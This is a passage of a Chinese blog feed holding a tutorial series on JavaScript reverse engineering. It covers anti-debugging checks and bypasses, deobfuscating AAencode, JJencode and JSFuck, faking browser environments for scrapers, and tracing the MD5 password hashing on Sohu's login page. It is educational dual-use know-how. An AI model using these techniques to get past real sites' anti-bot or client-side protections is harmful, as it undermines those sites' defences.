arcade"><span class="hljs-keyword">var</span> logCount = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">var</span> oldLog = <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>;<br><br>   <span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>) &#123;<br>     logCount++;<br>     <span class="hljs-keyword">if</span> (logCount &gt; <span class="hljs-number">2</span>) &#123;<br>       alert(<span class="hljs-string">&#x27;禁止调试！&#x27;</span>);<br>     &#125; <span class="hljs-keyword">else</span> &#123;<br>       oldLog.apply(<span class="hljs-built_in">console</span>, arguments);<br>     &#125;<br>   &#125;;<br></code></pre></td></tr></table></figure><p>打开浏览器，在 console 中调用 console.log:<br><img src="/2023/04/27/file-upload/240223153355888.png"><br>超过两次就会弹窗。</p><h3 id="代码运行的时间差"><a href="#代码运行的时间差" class="headerlink" title="代码运行的时间差"></a>代码运行的时间差</h3><figure class="highlight lasso"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs lasso"><span class="hljs-built_in">var</span> start = <span class="hljs-literal">new</span> <span class="hljs-built_in">Date</span>();<br>for (<span class="hljs-built_in">var</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000000</span>; i++) &#123;<br>  <span class="hljs-params">...</span><br>&#125;<br><span class="hljs-built_in">var</span> end = <span class="hljs-literal">new</span> <span class="hljs-built_in">Date</span>();<br><span class="hljs-built_in">var</span> timeDiff = end - start;<br><br><span class="hljs-keyword">if</span> (timeDiff &gt; <span class="hljs-number">1000</span>) &#123; <span class="hljs-comment">// 假设大于1秒则视为调试</span><br>  alert(<span class="hljs-string">&#x27;禁止调试！&#x27;</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>打断点，运行：<br><img src="/2023/04/27/file-upload/240223154404867.png"></p><h3 id="toString-检测"><a href="#toString-检测" class="headerlink" title="toString 检测"></a>toString 检测</h3><p>当我们打断点调试时，当鼠标放到一个方法或者值上时，就会默认执行 toString 方法，查看其内容，可以根据这一点进行反调试。<br>以百度为例，随便找一个 js 文件，打好断点：<br><img src="/2023/04/27/file-upload/240223155419302.png"><br>在 console 中执行：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">var</span> aaa = createLocalRequire.toString;<br>createLocalRequire.toString = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;<span class="hljs-built_in">console</span>.<span class="hljs-built_in">log</span>(<span class="hljs-string">&quot;debugging!&quot;</span>); <span class="hljs-keyword">return</span> aaa();&#125;<br></code></pre></td></tr></table></figure><p>鼠标移上去查看其值：<br><img src="/2023/04/27/file-upload/240223155618101.png"><br>console 中已经进行了打印：<br><img src="/2023/04/27/file-upload/240223155634508.png"></p><p>除此之外，还有很多检测方式，例如检测非浏览器环境，检测栈的层数 caller 等等。</p><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>一般分为虚拟机和非虚拟机两种。<br>虚拟机是指使用 eval 或者 Function 开启了一个新上下文，剩下的称之为非虚拟机。</p><h3 id="过-debugger（显性）"><a href="#过-debugger（显性）" class="headerlink" title="过 debugger（显性）"></a>过 debugger（显性）</h3><h4 id="非虚拟机-："><a href="#非虚拟机-：" class="headerlink" title="非虚拟机 ："></a>非虚拟机 ：</h4><p>以下面的代码为例：</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs scss">function <span class="hljs-built_in">xx</span>()&#123;<br>    debugger;<br>    console<span class="hljs-selector-class">.log</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br>function <span class="hljs-built_in">ry4n</span>()&#123;<br>    <span class="hljs-built_in">xx</span>();<br>&#125;<br><br><span class="hljs-built_in">ry4n</span>();<br></code></pre></td></tr></table></figure><p>直接运行会在 debugger 处断住：<br><img src="/2023/04/27/file-upload/240223175315351.png"></p><h5 id="编辑断点"><a href="#编辑断点" class="headerlink" title="编辑断点"></a>编辑断点</h5><p>可以先打断点，再将其属性设置为 false：<br><img src="/2023/04/27/file-upload/240223175456224.png"><br>此时可以成功过:<br><img src="/2023/04/27/file-upload/240223175537660.png"></p><h5 id="替换代码"><a href="#替换代码" class="headerlink" title="替换代码"></a>替换代码</h5><h6 id="override"><a href="#override" class="headerlink" title="override"></a>override</h6><p>首先在 override 处添加文件夹，并给予权限：<br><img src="/2023/04/27/file-upload/240223180135095.png"></p><p>接着把想修改的 js 发到 override：<br><img src="/2023/04/27/file-upload/240223180212850.png"><br>即可进行任意修改：<br><img src="/2023/04/27/file-upload/240223180257166.png"></p><h6 id="fiddler"><a href="#fiddler" class="headerlink" title="fiddler"></a>fiddler</h6><p>还有一种方式就是利用 fiddler。<br>打开监听，将想替换的数据包拖到 autoresponder：<br><img src="/2023/04/27/file-upload/240223180443332.png"><br>通过 find a file，选择想替换的目标文件即可。<br><img src="/2023/04/27/file-upload/240223180501796.png"></p><h4 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h4><p>如果是虚拟机的情况，可以通过类似<br><code>Function.prototype.constructor = function(X)&#123;if(X) xxx&#125;</code><br>的方法，进行代码或者执行逻辑的修改。</p><h3 id="隐性"><a href="#隐性" class="headerlink" title="隐性"></a>隐性</h3><p>看浏览器正常堆栈和本地堆栈。</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js 逆向系列05-浏览器和 js 的关系</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9705-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%92%8Cjs%E7%9A%84%E5%85%B3%E7%B3%BB/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9705-%E6%B5%8F%E8%A7%88%E5%99%A8%E5%92%8Cjs%E7%9A%84%E5%85%B3%E7%B3%BB/</url>
    
    <content type="html"><![CDATA[<h1 id="js-逆向系列05-浏览器和-js-的关系"><a href="#js-逆向系列05-浏览器和-js-的关系" class="headerlink" title="js 逆向系列05-浏览器和 js 的关系"></a>js 逆向系列05-浏览器和 js 的关系</h1><p>打开一个浏览器，其基本的功能如下：<br>渲染 DOM<br>刷新（重新加载）<br>执行 js 脚本</p><h2 id="浏览器组成"><a href="#浏览器组成" class="headerlink" title="浏览器组成"></a>浏览器组成</h2><p>DOM+BOM+js 引擎 &#x3D; 浏览器</p><h3 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h3><p>文档对象模型（DOM）： DOM 是 JavaScript 操作网页内容的接口。当网页加载完成后，浏览器会将网页的结构（HTML 文档）解析成一个由节点组成的树形结构，这个结构就是 DOM。JavaScript 可以通过 DOM 提供的接口来操作网页的结构、内容和样式。</p><h3 id="BOM"><a href="#BOM" class="headerlink" title="BOM"></a>BOM</h3><p>浏览器对象模型（BOM）： BOM 是浏览器提供的 JavaScript 对象集合，它使 JavaScript 可以与浏览器窗口进行交互，比如控制浏览器的导航、获取浏览器窗口的大小和位置等。各个浏览器对 BOM的实现可能有所不同。</p><h3 id="js-引擎"><a href="#js-引擎" class="headerlink" title="js 引擎"></a>js 引擎</h3><p>js 引擎用于解析和执行 JavaScript 代码。它将 JavaScript 代码转换为计算机能够理解和执行的指令的核心部分。JavaScript 引擎的主要任务是将 JavaScript 代码编译成可执行的机器码，并在运行时执行这些代码。</p><p>常见的 js 引擎有：</p><ul><li>V8 引擎（google chrome）</li><li>SpiderMonkey（firefox）</li><li>Chakra（edge）</li><li>quickjs（ffg）</li></ul><p>JavaScript 通过操作 DOM 来实现对网页内容的动态改变和交互，同时通过 BOM 来控制浏览器的行为和提供与浏览器窗口相关的信息和功能。</p><p>简单来说<br><strong>DOM</strong>负责：<br>1、html 增删改查api<br>2、html 数据格式<br>3、渲染 Canvas…</p><p><strong>BOM</strong> 负责:<br>1、浏览器自己实现的一些类包括 location navigator<br>2、ssl btoa AES DES…</p><p>而 js 引擎其实就是<strong>js 解释器</strong></p><p>例如 document.createElement(“div”)<br><img src="/2023/04/27/file-upload/240222145702504.png"><br>在浏览器的 console 中可以运行，但是本地无法执行，因为本地没有 BOM。</p><p>另外，浏览器实现的对象，会添加一个特性，只读，不可写，但是在本地环境中没有 dom，bom，就可以进行重写。 </p><h2 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h2><p>伪造环境和前面提到的抠取 js 是两种不同的方法，抠取 js 是删除环境的一些代码，一般简单的网站直接抠代码即可，复杂一点的可能就要进行环境伪造。</p><h3 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h3><p>支持多线程，爬取速度快，而 selenium 需要开启一个新的进程，并且开放权限太少，资源占用较高。</p><h3 id="如何伪造"><a href="#如何伪造" class="headerlink" title="如何伪造"></a>如何伪造</h3><p>伪造也分为两种，全部伪造和给指定的网站伪造。<br>1、全部伪造<br>例如 python 中的 jsdom，实现了完整的 DOM 环境，nodedjs 完整实现了 DOM+BOM ，但是都容易被检测。<br><strong>特点：费时费力一劳永逸</strong><br>2、给指定网站伪造<br>这就需要知道网站检测了什么内容，可以通过如下方法：</p><ul><li>通过调试</li><li>全局异常捕获</li><li>本地环境运行看报错</li></ul><p>以 navigator 的 ua 头为例，首先在 console 中查看：<br><img src="/2023/04/27/file-upload/240222151521029.png"><br>到本地环境中，运行</p><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">var navigator = &#123;<br>    userAgent: <span class="hljs-string">&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36 Edg/121.0.0.0&quot;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>执行 navigator.userAgent：<br><img src="/2023/04/27/file-upload/240222151604563.png"></p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js 逆向系列04-常见混淆原理</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9704-%E5%B8%B8%E8%A7%81%E6%B7%B7%E6%B7%86%E5%8E%9F%E7%90%86/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9704-%E5%B8%B8%E8%A7%81%E6%B7%B7%E6%B7%86%E5%8E%9F%E7%90%86/</url>
    
    <content type="html"><![CDATA[<h1 id="js-逆向系列04-常见混淆原理"><a href="#js-逆向系列04-常见混淆原理" class="headerlink" title="js 逆向系列04-常见混淆原理"></a>js 逆向系列04-常见混淆原理</h1><p>js混淆有两种：</p><ul><li><p>变量</p></li><li><p>代码执行流程</p></li></ul><p> 混淆代码的执行流程一般通过控制流混淆来实现，下面主要介绍一下常见的变量混淆方式。</p><h2 id="基本混淆方法"><a href="#基本混淆方法" class="headerlink" title="基本混淆方法"></a>基本混淆方法</h2><p>将值放到新的变量中，再通过 window 来取：<br><img src="/2023/04/27/file-upload/240220174602364.png"><br>也可以结合 base64 编码，即（btoa，atob）<br><img src="/2023/04/27/file-upload/240220174639689.png"><br>先通过 atob(ry4n3[0])，即 YWJj 的 base64decode，解码得到 abc，再用 window[abc]来获取变量 abc 的值——“test”<br>也可以利用 eval 方法，例如 <code>eval(&quot;function xx()&#123;return 12&#125; xx()&quot;)</code>，结合上 base64：<br><img src="/2023/04/27/file-upload/240220175045911.png"><br>如果是利用 eval 进行混淆，可以直接在 eval 处下断点，跟进虚拟机即可看到明文：<br><img src="/2023/04/27/file-upload/240220175146178.png"></p><p>js 默认支持 unicode 编码，因此可以支持生僻语言等等，AA 加密和 JJ 加密就是利用了这一点。</p><h2 id="AA-加密"><a href="#AA-加密" class="headerlink" title="AA 加密"></a>AA 加密</h2><p>AA 加密和 JJ 加密都可以通过 sojson 网站进行。<br>sojson：<a href="https://www.sojson.com/aaencode.html">JS加密，JS 安全加密， AAencode 加密 —在线加密 (sojson.com)</a><br><img src="/2023/04/27/file-upload/240221133328218.png"><br>以 console.log(1)为例，加密后的代码如图所示，执行后成功打印出 1.</p><h2 id="JJ-加密"><a href="#JJ-加密" class="headerlink" title="JJ 加密"></a>JJ 加密</h2><p>JJ 加密与 AA 加密类似，都是利用 js 支持 unicode 编码，并且都是通过 eval+Function 的方式进行，下面尝试对 JJ 加密进行调试。<br>同样以 console.log(1)为例：<br><img src="/2023/04/27/file-upload/240221133551017.png"><br>首先这里可以直接运行出值。<br>最后一行代码为：</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs powershell">sojson.<span class="hljs-variable">$</span>(sojson.<span class="hljs-variable">$</span>(sojson.<span class="hljs-variable">$</span><span class="hljs-variable">$</span> + <span class="hljs-string">&quot;\&quot;</span><span class="hljs-string">&quot; + sojson.<span class="hljs-variable">$</span><span class="hljs-variable">$__</span> + sojson._<span class="hljs-variable">$</span> + &quot;</span>\\<span class="hljs-string">&quot; + sojson.__<span class="hljs-variable">$</span> + sojson.<span class="hljs-variable">$_</span><span class="hljs-variable">$</span> + sojson.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span> + &quot;</span>\\<span class="hljs-string">&quot; + sojson.__<span class="hljs-variable">$</span> + sojson.<span class="hljs-variable">$</span><span class="hljs-variable">$_</span> + sojson._<span class="hljs-variable">$</span><span class="hljs-variable">$</span> + sojson._<span class="hljs-variable">$</span> + (![] + &quot;</span><span class="hljs-string">&quot;)[sojson._<span class="hljs-variable">$_</span>] + sojson.<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$_</span> + &quot;</span>.<span class="hljs-string">&quot; + (![] + &quot;</span><span class="hljs-string">&quot;)[sojson._<span class="hljs-variable">$_</span>] + sojson._<span class="hljs-variable">$</span> + &quot;</span>\\<span class="hljs-string">&quot; + sojson.__<span class="hljs-variable">$</span> + sojson.<span class="hljs-variable">$__</span> + sojson.<span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span> + &quot;</span>(<span class="hljs-string">&quot; + sojson.__<span class="hljs-variable">$</span> + &quot;</span>)<span class="hljs-string">&quot; + &quot;</span>\<span class="hljs-string">&quot;&quot;</span>)())(sojson = &#123;<br>    ___: ++sojson,<br>    <span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span><span class="hljs-variable">$</span>: (![] + <span class="hljs-string">&quot;&quot;</span>)[<span class="hljs-type">sojson</span>]<br>&#125;);<br><br></code></pre></td></tr></table></figure><p>这里执行了一个方法，肯定是在该方法运行之后，才完成了字符串的拼接以及整体代码的运行。<br><img src="/2023/04/27/file-upload/240221133832514.png"><br>很明显这里是一个 Function，尝试改写 Function：<br><img src="/2023/04/27/file-upload/240221134134535.png"><br>Function &#x3D; function(){debugger;}这里加上一个 debugger，类似于 hook 的形式，打上断点并运行，但是没有断住。<br>看看上一行代码：<br><img src="/2023/04/27/file-upload/240221134510273.png"><br><img src="/2023/04/27/file-upload/240221134518150.png"><br><img src="/2023/04/27/file-upload/240221134527929.png"><br>sojson 是一个 object，其实也就是 OBJECT[0].constructor.constructor，执行后就是 Function:<br><img src="/2023/04/27/file-upload/240221134615382.png"><br>由于是直接从原型链取的，因此无法通过改写来 debug。<br><img src="/2023/04/27/file-upload/240221135955534.png"><br>可以直接改写 sojson. $ ,（注意，先在 28 行打断点，执行，断住时，改写为 sojson.$&#x3D;function(){debugger;}），此时能够直接进到虚拟机里，即<br><code>sojson.$ = function()&#123;debugger;&#125;</code><br>通过 arguments 打印出此时的所有参数，可以看到<br><code>&quot;return&quot;co\156\163ole.lo\147(1)&quot;&quot;</code><br>这段内容还是经过简单的加密处理的，直接通过控制台还原一下：<br><img src="/2023/04/27/file-upload/240221140253581.png"><br>最终结果即为 console.log(1)</p><h2 id="jsfuck"><a href="#jsfuck" class="headerlink" title="jsfuck"></a>jsfuck</h2><p>javascript 是一种灵活的动态语言，其允许使用多种语法结构和运算符来实现具体逻辑，并且允许进行各种类型的数据转换，jsfuck 就是利用了这些特性，结合位运算操作实现的一种加密方式。<br>还是以 console.log(1)为例，同样可以直接运行，因为他没有改变代码的语法和形式等等，只是进行了混淆操作：<br><img src="/2023/04/27/file-upload/240221141132020.png"><br>jsfuck 混淆之后的代码要进行调试较为麻烦，可以通过下面的代码来实现快速解密：</p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">Function.prototype.__defineGetter__(<span class="hljs-string">&#x27;constructor&#x27;</span>, <span class="hljs-keyword">function</span><span class="hljs-params">()</span> &#123;  <br><span class="hljs-keyword">return</span> <span class="hljs-keyword">function</span><span class="hljs-params">(<span class="hljs-rest_arg">...args</span>)</span> &#123;  <br>console.log(<span class="hljs-string">&#x27;code:&#x27;</span>, ...args);  <br><span class="hljs-keyword">return</span> Function(...args);  <br>&#125;;  <br>&#125;);<br></code></pre></td></tr></table></figure><p>这里定义了一个 getter 方法，该方法会在访问对象的 constructor 属性时被调用。在这个 getter 方法中，它重新定义了 constructor 属性，使得在访问 constructor 属性时，会执行一个自定义的函数。<br>该函数会接收传入的参数即…args ，然后打印出参数  args ，最后返回一个新的  Function  对象，该对象与原始的 Function 构造函数的行为相同。<br>JSFuck 加密后的代码执行时，通常会创建一个 Function 对象，然后对他进行调用。通过重定义 constructor 属性，并在访问时输出参数，我们可以获取到加密后的代码内容，并且还可以将其作为参数传递给新的 Function 对象，从而执行原始代码。<br>例如，我对下面代码进行 jsfuck 混淆：</p><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs stata"><span class="hljs-keyword">var</span> <span class="hljs-keyword">test</span>=<span class="hljs-string">&quot;123&quot;</span><br>console.<span class="hljs-built_in">log</span>(<span class="hljs-keyword">test</span>)<br></code></pre></td></tr></table></figure><p><img src="/2023/04/27/file-upload/240221141822501.png"><br>可以看到很多 escape 和 location，最终跳到了原始的明文代码，并且输出了结果 123.</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js 逆向系列 03-常见加解密二</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9703-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E4%BA%8C/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9703-%E5%B8%B8%E8%A7%81%E5%8A%A0%E5%AF%86%E4%BA%8C/</url>
    
    <content type="html"><![CDATA[<h1 id="js-逆向系列-03-常见加解密二"><a href="#js-逆向系列-03-常见加解密二" class="headerlink" title="js 逆向系列 03-常见加解密二"></a>js 逆向系列 03-常见加解密二</h1><p>在完成基本的调试和加密函数的定位之后，下面要做的就是抠取 js。<br>一般有两种方法：</p><ul><li>抠 this 对象</li><li>不抠 this 对象<br>先讲第一种，不抠对象。</li></ul><h2 id="不抠对象"><a href="#不抠对象" class="headerlink" title="不抠对象"></a>不抠对象</h2><p>把 md5 加密函数所在的整个 js 文件复制到 notepad，选择折叠所有层次：<br><img src="/2023/04/27/file-upload/240220095725690.png"><br>找到 md5，根据缩进，仅将 md5:function(t){…}部分取出来，复制到snippets中：<br><img src="/2023/04/27/file-upload/240220095822255.png"><br>删除最后的逗号等，将格式调整好：<br><img src="/2023/04/27/file-upload/240220095951315.png"><br>直接运行会报错函数需要一个函数名：<br><img src="/2023/04/27/file-upload/240220100011973.png"><br>在 js 中，md5:function(t){…}这种形式是无法直接运行的。<br><img src="/2023/04/27/file-upload/240220100155458.png"><br>改为 let md5 &#x3D; function(t){…}，可以看到此时运行不会报错。<br>成功执行：<br><img src="/2023/04/27/file-upload/240220100251336.png"></p><h2 id="抠对象"><a href="#抠对象" class="headerlink" title="抠对象"></a>抠对象</h2><p>跟前面一种方法相比，这里需要往上多抠一级。<br><img src="/2023/04/27/file-upload/240220160239910.png"><br>需要把包含 md5 的对象都复制出来，放到 snippets 中，直接运行：<br><img src="/2023/04/27/file-upload/240220160335234.png"><br>如果是全局变量（例如 [xxx &#x3D;]只有一处），可以直接把整个 js 拿出来直接运行。<br>成功拿到加密数据。虽然复制的内容较于第一种较多，但是无需改动代码。</p><p>对于一个加密的网站，在进行基本的调试，定位之后，找到加密函数，并且将关键js代码抠取出来放到本地运行，再将自己的明文通过加密函数加密，传值到服务器，至此基本的js逆向流程就已经结束。</p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js 逆向系列02-常见加解密一</title>
    <link href="/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9702-%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B8%80/"/>
    <url>/2024/07/23/js%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9702-%E5%B8%B8%E8%A7%81%E5%8A%A0%E8%A7%A3%E5%AF%86%E4%B8%80/</url>
    
    <content type="html"><![CDATA[<h1 id="js-逆向系列02-常见加解密一"><a href="#js-逆向系列02-常见加解密一" class="headerlink" title="js 逆向系列02-常见加解密一"></a>js 逆向系列02-常见加解密一</h1><h2 id="js-逆向流程"><a href="#js-逆向流程" class="headerlink" title="js 逆向流程"></a>js 逆向流程</h2><p>js 逆向的一般流程如下：<br>抓包<br>调试<br>抠js<br>改写<br>本地运行出值<br>请求服务器拿值</p><h2 id="常见加密方法分类介绍"><a href="#常见加密方法分类介绍" class="headerlink" title="常见加密方法分类介绍"></a>常见加密方法分类介绍</h2><h3 id="对称加密（Symmetric-Encryption）"><a href="#对称加密（Symmetric-Encryption）" class="headerlink" title="对称加密（Symmetric Encryption）"></a>对称加密（Symmetric Encryption）</h3><p>在对称加密中，发送和接收方使用相同的密钥来加密和解密数据。常见的对称加密算法包括：</p><ul><li><strong>DES（Data Encryption Standard）</strong>：是一种对称密钥加密算法，已经不推荐使用，因为它的密钥长度较短，易受到暴力破解攻击。</li><li><strong>AES（Advanced Encryption Standard）</strong>：目前最常用的对称加密算法之一，支持128位、192位和256位的密钥长度，安全性较高。<br><strong>特点：</strong></li><li>加解密速度快，适合大数据量的加密和解密。</li><li>密钥管理相对容易，但需要确保密钥安全传输。</li></ul><h3 id="非对称加密（Asymmetric-Encryption）"><a href="#非对称加密（Asymmetric-Encryption）" class="headerlink" title="非对称加密（Asymmetric Encryption）"></a>非对称加密（Asymmetric Encryption）</h3><p>在非对称加密中，使用一对密钥，包括公钥和私钥，公钥用于加密，私钥用于解密。常见的非对称加密算法包括：</p><ul><li><strong>RSA（Rivest-Shamir-Adleman）</strong>：基于大数分解的数学难题，是最早也是最广泛使用的非对称加密算法之一。</li><li><strong>ECC（Elliptic Curve Cryptography）</strong>：利用椭圆曲线上的点运算问题来构建的加密算法，相比RSA，在相同的安全级别下，所需密钥长度更短，计算量更小。<br><strong>特点：</strong></li><li>加解密速度相对较慢，适合于少量数据或者密钥交换。</li><li>公钥用于加密，私钥用于解密，提供了更好的安全性。</li><li>适合解决密钥交换和数字签名等问题。</li></ul><h3 id="哈希加密（Hash-Encryption）"><a href="#哈希加密（Hash-Encryption）" class="headerlink" title="哈希加密（Hash Encryption）"></a>哈希加密（Hash Encryption）</h3><p>哈希加密是一种单向加密方式，它将任意长度的数据映射为固定长度的哈希值。常见的哈希加密算法包括：</p><ul><li><strong>MD5（Message Digest Algorithm 5）</strong>：产生128位的哈希值，由于其存在碰撞风险和安全性问题，已经不推荐用于加密应用。</li><li><strong>SHA-1（Secure Hash Algorithm 1）</strong>：产生160位的哈希值，也存在碰撞风险，逐渐被弃用。</li><li><strong>SHA-256、SHA-384、SHA-512</strong>：SHA家族的变种，分别产生不同长度的哈希值，安全性更高。<br><strong>特点：</strong></li><li>单向加密，不可逆。</li><li>对于相同的输入，始终产生相同的输出。</li></ul><p><strong>tips:对于 MD5，SHA-1 ，可以记住 123456 对应的密文，以便在进行 js 逆向时快速识别出其加密方式。</strong><br>明文：123456<br>密文：</p><ul><li>MD5：e10adc3949ba59abbe56e057f20f883e</li><li>SHA-1：7c4a8d09ca3762af61e59520943dc26494f8941b</li></ul><h3 id="其他编码方式"><a href="#其他编码方式" class="headerlink" title="其他编码方式"></a>其他编码方式</h3><p>BASE64encode 等等，其不属于加密，而是一种编码方式。<br>base64 编码特点：A-Z a-z 0-9 + _  &#x3D;</p><h2 id="sohu-com"><a href="#sohu-com" class="headerlink" title="sohu.com"></a>sohu.com</h2><p>查看登录的网络请求，存在加密。<br><img src="/2023/04/27/file-upload/240219161243672.png"><br>密文为 e10adc3949ba59abbe56e057f20f883e，很明显这里就是 MD5 的加密方式。（记 123456 密文的原因）</p><h3 id="快速定位"><a href="#快速定位" class="headerlink" title="快速定位"></a>快速定位</h3><p><strong>tips:找距离断点最近的方法，就是看智能提示(CTRL 键开关)，什么时候没有智能提示了，就是该方法的开始</strong><br>下面来尝试快速定位查找加密方法。<br>请求的 url 为 <code>https://v4.passport.sohu.com/i/login/116005</code> ，post 请求的 payload 为 <code>userid=test%40123.com&amp;password=e10adc3949ba59abbe56e057f20f883e&amp;appid=116005&amp;nf=1 </code><br>考虑通过以下几种方式来进行查找：</p><ul><li>XHR</li><li>post body 中的参数名——password,userid</li><li>url 特征</li></ul><h4 id="XHR"><a href="#XHR" class="headerlink" title="XHR"></a>XHR</h4><p>最先想到的方法肯定是 XHR 断点。<br>打好断点后，点击登录：<br><img src="/2023/04/27/file-upload/240220092650916.png"><br>在 send 处断住，可以看到这里已经是加密后的 password。</p><h4 id="password"><a href="#password" class="headerlink" title="password"></a>password</h4><p><img src="/2023/04/27/file-upload/240219163733090.png"><br>直接全局搜索 password，结果有数十处。<br>但是password 值肯定是先有一个对象，再对对象进行赋值等操作，可以通过.password 或者 password &#x3D;（如果加上空格需要美化输出）来进一步缩小范围。<br><img src="/2023/04/27/file-upload/240219164159909.png"><br>可以看到此时只剩下 8 条结果。逐条查看可以看到，显然这里利用了 MD5 加密：<br><img src="/2023/04/27/file-upload/240220093003936.png"></p><h4 id="userid"><a href="#userid" class="headerlink" title="userid"></a>userid</h4><p>userid 跟 password 类似，userid&#x3D;结果只有一处，在当前上下文中查找，也能找到 md5:function(t){…}<br><img src="/2023/04/27/file-upload/240220093205355.png"></p><h4 id="login"><a href="#login" class="headerlink" title="&#x2F;login"></a>&#x2F;login</h4><p>login 同样可以找到：<br><img src="/2023/04/27/file-upload/240220093350347.png"></p><h4 id="123456789、1732584193"><a href="#123456789、1732584193" class="headerlink" title="123456789、1732584193"></a>123456789、1732584193</h4><p><img src="/2023/04/27/file-upload/240219163440961.png"><br>123456789 和 1732584193 都是 md5 加密中默认的模值，如果采用了默认的 md5 加密就必定会出现。<br>与前面几种方法不同，搜索这类内容，可以直接跟进加密函数中，再根据调用栈，就能直接跟到加密之前的明文值（此处为 123456）。<br>为什么要找加密之前的明文，因为网站可能会将用户的输入作一些拼接过滤等操作（加盐），再进行加密编码等等，因此可能需要从明文开始追踪。在明文跟密文中间的部分，肯定就是加密函数。<br>打好断点，运行查看调用栈：<br><img src="/2023/04/27/file-upload/240220093759190.png"><br>往上找一个，就能发现明文为 123456：<br><img src="/2023/04/27/file-upload/240220093914607.png"></p>]]></content>
    
    
    <categories>
      
      <category>js</category>
      
    </categories>
    
    
    <tags>
      
      <tag>js</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>js 逆向系列01-断点&amp;方法栈</title>
    <link href="/2024/07/23/js%20%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9701-%E6%96%AD%E7%82%B9&amp;%E6%96%B9%E6%B3%95%E6%A0%88/"/>
    <url>/2024/07/23/js%20%E9%80%86%E5%90%91%E7%B3%BB%E5%88%9701-%E6%96%AD%E7%82%B9&amp;%E6%96%B9%E6%B3%95%E6%A0%88/</url>
    
